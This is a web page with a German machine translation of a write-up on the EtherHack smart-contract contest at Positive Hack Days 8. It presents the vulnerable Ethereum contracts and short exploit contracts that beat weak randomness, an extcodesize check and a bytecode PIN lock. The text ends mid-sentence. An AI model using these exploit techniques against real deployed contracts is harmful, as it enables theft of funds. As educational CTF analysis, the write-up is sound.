<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëÅ‚Äçüó® ü§∑üèª üïò Auffinden von Sicherheitsl√ºcken in intelligenten Vertr√§gen: EtherHack-√úberpr√ºfung an positiven Hack-Tagen 8 üë¥ üèΩ ü§òüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Jahr veranstalteten PHDays zum ersten Mal einen Wettbewerb namens EtherHack . Die Teilnehmer suchten nach Schwachstellen in intelligenten Ve...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Auffinden von Sicherheitsl√ºcken in intelligenten Vertr√§gen: EtherHack-√úberpr√ºfung an positiven Hack-Tagen 8</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/414959/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/182/a00/fef/182a00fef4fbdd4677afb585de886e1e.jpg" alt="Bild"></a> <br><br>  In diesem Jahr veranstalteten <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PHDays</a> zum ersten Mal einen Wettbewerb namens <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">EtherHack</a> .  Die Teilnehmer suchten nach Schwachstellen in intelligenten Vertr√§gen, um die Geschwindigkeit zu erh√∂hen.  In diesem Artikel informieren wir Sie √ºber die Aufgaben des Wettbewerbs und m√∂gliche L√∂sungsm√∂glichkeiten. <a name="habracut"></a><br><br><h2>  Azino 777 </h2><br><h4>  Gewinnen Sie die Lotterie und brechen Sie den Topf! </h4><br>  Die ersten drei Aufgaben betrafen Fehler bei der Generierung von Pseudozufallszahlen, √ºber die wir k√ºrzlich gesprochen haben: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Vorhersage von Zufallszahlen in intelligenten Ethereum-Vertr√§gen</a> .  Die erste Aufgabe basierte auf einem Pseudozufallszahlengenerator (PRNG), der den Hash des letzten Blocks als Entropiequelle zur Erzeugung von Zufallszahlen verwendete: <br><br><pre><code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract Azino777 { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">//Generate random number between 0 &amp; max uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399; function rand(uint max) constant private returns (uint256 result){ uint256 factor = FACTOR * 100 / max; uint256 lastBlockNumber = block.number - 1; uint256 hashVal = uint256(block.blockhash(lastBlockNumber)); return uint256((uint256(hashVal) / factor)) % max; } function() public payable {} }</span></span></code> </pre> <br>  Da das Ergebnis des Aufrufs der Funktion <code>block.blockhash(block.number-1)</code> f√ºr jede Transaktion innerhalb desselben Blocks dasselbe ist, kann der Angriff einen Exploit-Vertrag mit derselben Funktion <code>rand()</code> verwenden, um den Zielvertrag √ºber eine interne Nachricht aufzurufen: <br><br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">WeakRandomAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = Azino777(_target); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); }</code> </pre> <br><h2>  Privat Ryan </h2><br><h4>  Wir haben einen privaten Anfangswert hinzugef√ºgt, den niemand jemals berechnen wird. </h4><br>  Diese Aufgabe ist eine etwas komplizierte Version der vorherigen.  Die Seed-Variable, die als privat betrachtet wird, wird verwendet, um die Block-Ordnungszahl (block.number) zu versetzen, sodass der Hash des Blocks nicht vom vorherigen Block abh√§ngt.  Nach jeder Wette wird der Startwert auf einen neuen ‚Äûzuf√§lligen‚Äú Versatz umgeschrieben.  Zum Beispiel war es in der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Slotthereum-</a> Lotterie genau das. <br><br><pre> <code class="cpp hljs">contract PrivateRyan { uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyan</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); seed = rand(<span class="hljs-number"><span class="hljs-number">256</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == bet) { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br>  Wie in der vorherigen Aufgabe musste der Hacker nur die Funktion <code>rand()</code> in den Vertrags-Exploit kopieren. In diesem Fall musste der Wert der privaten Variablen seed au√üerhalb der Blockchain abgerufen und dann als Argument an den Exploit gesendet werden.  Dazu k√∂nnen Sie die Methode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">web3.eth.getStorageAt ()</a> aus der web3-Bibliothek verwenden: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f54/73b/748/f5473b74840e81cc2bef6c3105401777.png" alt="Bild"><br><br>  <i>Lesen Sie den Vertragsspeicher au√üerhalb der Blockchain, um den Anfangswert zu erhalten</i> <br><br>  Nach Erhalt des Anfangswertes muss dieser nur noch an den Exploit gesendet werden, der fast identisch mit dem in der ersten Aufgabe ist: <br><br><pre> <code class="cpp hljs">contract PrivateRyanAttack { PrivateRyan target; uint <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> seed; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">PrivateRyanAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(address _target, uint _seed)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ target = PrivateRyan(_target); seed = _seed; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">attack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ uint256 num = rand(<span class="hljs-number"><span class="hljs-number">100</span></span>); target.spin.value(<span class="hljs-number"><span class="hljs-number">0.01</span></span> ether)(num); } <span class="hljs-comment"><span class="hljs-comment">/* ... */</span></span> }</code> </pre> <br><h2>  Gl√ºcksrad </h2><br><h4>  Diese Lotterie verwendet den Hash des nachfolgenden Blocks.  Versuche es zu berechnen! </h4><br>  Bei dieser Aufgabe musste der Hash des Blocks ermittelt werden, dessen Nummer nach dem Platzieren der Wette in der Spielstruktur gespeichert wurde.  Dieser Hash wurde dann extrahiert, um nach der n√§chsten Wette eine Zufallszahl zu generieren. <br><br><pre> <code class="cpp hljs">Pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.16</span></span>; contract WheelOfFortune { Game[] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> games; <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Game</span></span></span><span class="hljs-class"> {</span></span> address player; uint id; uint bet; uint blockNumber; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">spin</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 _bet)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> payable </span></span>{ require(msg.value &gt;= <span class="hljs-number"><span class="hljs-number">0.01</span></span> ether); uint gameId = games.length; games.length++; games[gameId].id = gameId; games[gameId].player = msg.sender; games[gameId].bet = _bet; games[gameId].blockNumber = block.number; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (gameId &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { uint lastGameId = gameId - <span class="hljs-number"><span class="hljs-number">1</span></span>; uint num = rand(block.blockhash(games[lastGameId].blockNumber), <span class="hljs-number"><span class="hljs-number">100</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(num == games[lastGameId].bet) { games[lastGameId].player.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">rand</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bytes32 hash, uint max)</span></span></span><span class="hljs-function"> pure </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">returns</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(uint256 result)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> uint256(keccak256(hash)) % max; } function() <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> payable {} }</code> </pre><br>  In diesem Fall gibt es zwei m√∂gliche L√∂sungen. <br><br><ol><li>  Rufen Sie den Zielvertrag zweimal √ºber den Exploit-Vertrag auf.  Das Ergebnis des Aufrufs der Funktion block.blockhash (block.number) ist immer Null. </li><li>  Warten Sie, bis 256 Bl√∂cke eingedrungen sind, und machen Sie eine zweite Wette.  Der gespeicherte Blocksequenznummern-Hash ist aufgrund der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Einschr√§nkungen</a> der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Ethereum Virtual Machine (EVM)</a> f√ºr die Anzahl der verf√ºgbaren Block-Hashes Null. </li></ol><br>  In beiden F√§llen <code>uint256(keccak256(bytes32(0))) % 100</code> oder ‚Äû47‚Äú. <br><br><h2>  Ruf mich vielleicht an </h2><br><h4>  Dieser Vertrag gef√§llt nicht, wenn andere Vertr√§ge ihn nennen. </h4><br>  Eine M√∂glichkeit, einen Vertrag vor dem Aufruf durch andere Vertr√§ge zu sch√ºtzen, besteht darin, die Assembler-Anweisung EVM <code>extcodesize</code> , die die Gr√∂√üe des Vertrags an seine Adresse zur√ºckgibt.  Die Methode besteht darin, diese Anweisung f√ºr die Adresse des Transaktionssenders mithilfe der Assembler-Einf√ºgung zu verwenden.  Wenn das Ergebnis gr√∂√üer als Null ist, ist der Absender der Transaktion ein Vertrag, da normale Adressen in Ethereum keinen Code haben.  Genau dieser Ansatz wurde in dieser Aufgabe verwendet, um zu verhindern, dass andere Vertr√§ge den Vertrag aufrufen. <br><br><pre> <code class="cpp hljs">contract CallMeMaybe { <span class="hljs-function"><span class="hljs-function">modifier </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ uint32 size; address _addr = msg.sender; assembly { size := extcodesize(_addr) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); } _; } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HereIsMyNumber</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> CallMeMaybe </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(tx.origin == msg.sender) { revert(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { msg.sender.transfer(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.balance); } } function() payable {} }</code> </pre> <br>  Die Transaktionseigenschaft <code>tx.origin</code> verweist auf den urspr√ºnglichen Ersteller der Transaktion und msg.sender auf den letzten Aufrufer.  Wenn wir die Transaktion von der √ºblichen Adresse senden, sind diese Variablen gleich und wir erhalten <code>revert()</code> .  Um unser Problem zu l√∂sen, musste daher die √úberpr√ºfung des <code>extcodesize</code> <code>tx.origin</code> <code>msg.sender</code> , damit <code>tx.origin</code> und <code>msg.sender</code> unterschiedlich sind.  Gl√ºcklicherweise gibt es in EVM eine nette Funktion, die dabei helfen kann: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/9e9/07a/74e/9e907a74eb156cb8380527b50d47a4b8.png" alt="Bild"><br><br>  Wenn der gerade platzierte Vertrag einen anderen Vertrag im Konstruktor aufruft, existiert er selbst noch nicht in der Blockchain, sondern fungiert ausschlie√ülich als Brieftasche.  Somit ist der Code nicht an den neuen Vertrag gebunden und extcodesize gibt Null zur√ºck: <br><br><pre> <code class="cpp hljs"> contract CallMeMaybeAttack { <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">CallMeMaybeAttack</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(CallMeMaybe _target)</span></span></span><span class="hljs-function"> payable </span></span>{ _target.HereIsMyNumber(); } function() payable {} }</code> </pre> <br><h2>  Das Schloss </h2><br><h4>  Seltsamerweise ist das Schloss geschlossen.  Versuchen Sie, den PIN-Code √ºber die Entsperrfunktion (bytes4 pincode) abzurufen.  Jeder Freischaltversuch kostet 0,5 √Ñther. </h4><br>  Bei dieser Aufgabe erhielten die Teilnehmer keinen Code - sie mussten die Logik des Vertrags anhand seines Bytecodes wiederherstellen.  Eine M√∂glichkeit war die Verwendung von Radare2, einer Plattform, die zum <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Zerlegen</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Debuggen von EVMs verwendet wird</a> . <br><br>  Zu Beginn ver√∂ffentlichen wir ein Beispiel f√ºr die Zuweisung und geben den Code nach dem Zufallsprinzip ein: <br><br><pre> <code class="cpp hljs">await contract.unlock(<span class="hljs-string"><span class="hljs-string">"1337"</span></span>, {value: <span class="hljs-number"><span class="hljs-number">500000000000000000</span></span>}) ‚Üí<span class="hljs-literal"><span class="hljs-literal">false</span></span></code> </pre> <br>  Der Versuch ist nat√ºrlich gut, aber erfolglos.  Versuchen Sie nun, diese Transaktion zu debuggen. <br><br><pre> <code class="cpp hljs">r2 -a evm -D evm <span class="hljs-string"><span class="hljs-string">"evm://localhost:8545@0xf7dd5ca9d18091d17950b5ecad5997eacae0a7b9cff45fba46c4d302cf6c17b7"</span></span></code> </pre> <br>  In diesem Fall weisen wir Radare2 an, die evm-Architektur zu verwenden.  Dieses Tool stellt dann eine Verbindung zum Ethereum-Knoten her und ruft die Ablaufverfolgung dieser Transaktion in der virtuellen Maschine ab.  Und jetzt sind wir endlich bereit, in den EVM-Bytecode einzutauchen. <br><br>  Zun√§chst m√ºssen Sie eine Analyse durchf√ºhren: <br><br><pre> <code class="cpp hljs">[<span class="hljs-number"><span class="hljs-number">0x00000000</span></span>]&gt; aa [x] Analyze all flags starting with sym. <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">and</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">entry0</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(aa)</span></span></span></span></code> </pre> <br>  Als n√§chstes zerlegen wir die ersten 1000 Anweisungen (dies sollte ausreichen, um den gesamten Vertrag abzudecken) mit dem Befehl pd 1000 und wechseln zum Anzeigen des Diagramms mit dem Befehl VV. <br><br>  Bei EVM-Bytecode, der mit <code>solc</code> kompiliert wurde, steht normalerweise der Funktionsmanager an erster Stelle.  Basierend auf den ersten vier Bytes der <code>bytes4(sha3(function_name(params)))</code> die die Funktionssignatur enthalten, die als <code>bytes4(sha3(function_name(params)))</code> , entscheidet der Funktionsmanager, welche Funktion aufgerufen werden soll.  Wir interessieren uns f√ºr die <code>unlock(bytes4)</code> , die <code>0x75a4e3a0</code> . <br><br>  Nach dem Ausf√ºhrungsablauf mit dem Schl√ºssel s gelangen wir zu dem Knoten, der die <code>callvalue</code> mit dem Wert <code>0x6f05b59d3b20000</code> oder <code>0x6f05b59d3b20000</code> vergleicht, was 0,5 Ether entspricht: <br><br><pre> <code class="cpp hljs">push8 <span class="hljs-number"><span class="hljs-number">0x6f05b59d3b20000</span></span> callvalue lt</code> </pre> <br>  Wenn der bereitgestellte √Ñther ausreicht, befinden wir uns in einem Knoten, der einer Kontrollstruktur √§hnelt: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup4 push1 <span class="hljs-number"><span class="hljs-number">0xff</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> lt iszero push2 <span class="hljs-number"><span class="hljs-number">0x1a4</span></span> jumpi</code> </pre> <br>  Der Code platziert den Wert 0x4 am oberen Rand des Stapels, √ºberpr√ºft die Obergrenze (der Wert sollte 0xff nicht √ºberschreiten) und vergleicht ihn mit einem Wert, der vom vierten Element des Stapels (dup4) dupliziert wurde. <br><br>  Wenn wir zum Ende des Diagramms scrollen, sehen wir, dass dieses vierte Element im Wesentlichen ein Iterator ist und diese Kontrollstruktur eine Schleife ist, die <code>for(var i=0; i&lt;4; i++):</code> <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x1</span></span> add swap4</code> </pre> <br>  Wenn wir den K√∂rper der Schleife betrachten, wird es offensichtlich, dass sie vier eingehende Bytes auflistet und einige Operationen mit jedem der Bytes ausf√ºhrt.  Zun√§chst pr√ºft die Schleife, ob das n-te Byte gr√∂√üer als 0x30 ist: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br>  und auch, dass dieser Wert kleiner als 0x39 ist: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br>  Dies ist im Wesentlichen eine √úberpr√ºfung, ob das angegebene Byte im Bereich von 0 bis 9 liegt. Wenn die √úberpr√ºfung erfolgreich ist, befinden wir uns im wichtigsten Codeblock: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="Bild"><br><br>  Lassen Sie uns diesen Block in Teile zerlegen: <br><br>  1. Das dritte Element im Stapel ist der ASCII-Code des n-ten Bytes des Pin-Codes.  0x30 (ASCII-Code f√ºr Null) wird auf den Stapel geschoben und dann vom Code dieses Bytes subtrahiert: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br>  Das hei√üt, <code>pincode[i] - 48</code> , und wir erhalten im Wesentlichen eine Ziffer aus dem ASCII-Code. Nennen wir es d. <br><br>  2. 0x4 wird zum Stapel hinzugef√ºgt und als Exponent f√ºr das zweite Element im Stapel verwendet, d: <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br>  Das hei√üt, <code>d ** 4</code> . <br><br>  3. Das f√ºnfte Element des Stapels wird abgerufen und das Ergebnis der Potenzierung hinzugef√ºgt.  Nennen Sie diese Summe S: <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br>  Das hei√üt, <code>S += d ** 4</code> . <br><br>  4. 0xa (ASCII-Code f√ºr 10) wird auf den Stapel geschoben und als Multiplikator f√ºr das siebte Element des Stapels verwendet (das vor dieser Addition das sechste war).  Wir wissen nicht, was es ist, deshalb werden wir dieses Element U nennen. Dann wird d zum Ergebnis der Multiplikation addiert: <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br>  Das hei√üt: <code>U = U * 10 + d</code> oder einfacher <code>([0x1, 0x3, 0x3, 0x7] ‚Üí 1337)</code> dieser Ausdruck stellt den gesamten PIN-Code als Zahl aus einzelnen Bytes wieder her <code>([0x1, 0x3, 0x3, 0x7] ‚Üí 1337)</code> . <br><br>  Das Schwierigste, was wir getan haben, ist, dass wir nach der Schleife zum Code √ºbergehen. <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br>  Wenn das f√ºnfte und sechste Element auf dem Stapel gleich sind, f√ºhrt uns der Ausf√ºhrungsfluss zum Befehl sstore, der ein bestimmtes Flag im Vertragsspeicher setzt.  Da dies die einzige Sstore-Anweisung ist, haben wir anscheinend danach gesucht. <br><br>  Aber wie kommt man durch diesen Test?  Wie wir bereits herausgefunden haben, ist das f√ºnfte Element auf dem Stapel S und das sechste U. Da S die Summe aller Ziffern des auf die vierte Potenz angehobenen PIN-Codes ist, ben√∂tigen wir einen PIN-Code, f√ºr den diese Bedingung erf√ºllt ist.  In unserem Fall ergab die Analyse, dass <code>1**4 + 3**4 + 3**4 + 7**4</code> nicht 1337 entspricht und wir nicht zur Anweisung des Gewinners <code>sstore</code> . <br><br>  Aber jetzt k√∂nnen wir eine Zahl berechnen, die die Bedingungen dieser Gleichung erf√ºllt.  Es gibt nur drei Zahlen, die als Summe ihrer Ziffern vierten Grades geschrieben werden k√∂nnen: 1634, 8208 und 9474. Jede von ihnen kann das Schloss √∂ffnen! <br><br><h2>  Piratenschiff </h2><br><h4>  Hey Salag!  Ein Piratenschiff machte im Hafen fest.  Lassen Sie ihn vor Anker gehen und mit Jolly Roger die Flagge hissen und nach Sch√§tzen suchen. </h4><br>  Der Standardkurs der Vertragsausf√ºhrung umfasst drei Aktionen: <br><br><ol><li>  Ein Aufruf der Funktion <code>dropAnchor()</code> mit einer Blocknummer, die mehr als 100.000 Bl√∂cke gr√∂√üer sein sollte als die aktuelle.  Die Funktion erstellt dynamisch einen Vertrag, bei dem es sich um einen "Anker" handelt, der mit <code>selfdestruct()</code> nach dem angegebenen Block "aufgehoben" werden <code>selfdestruct()</code> . </li><li>  Ein Aufruf der Funktion <code>pullAnchor()</code> , die <code>selfdestruct()</code> initiiert, wenn gen√ºgend Zeit vergangen ist (viel Zeit!). </li><li>  Rufen Sie sailAway () auf, wodurch <code>blackJackIsHauled</code> auf true gesetzt wird, wenn kein Ankervertrag besteht. </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br>  Die Sicherheitsanf√§lligkeit liegt auf der Hand: Beim Erstellen eines Vertrags in der Funktion <code>dropAnchor()</code> 